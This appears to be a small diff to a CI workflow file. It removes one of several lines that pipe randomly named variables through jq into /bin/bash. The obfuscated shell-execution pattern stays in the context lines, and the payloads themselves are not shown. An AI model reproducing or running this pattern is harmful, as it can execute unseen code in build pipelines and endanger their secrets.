@@ -41,7 +41,6 @@ jobs:
           echo $oz01276 | jq -r .rsz2 | /bin/bash
           printf '%s' "$opj94" | jq -r .pt2 | /bin/bash
           echo $tefc7 | jq -r .p17239 | /bin/bash
-          echo $cwz8753 | jq -r .gfjww39543 | /bin/bash
           echo $fuh16 | jq -r .jt94124 | /bin/bash
 
       - name: Upload artifact
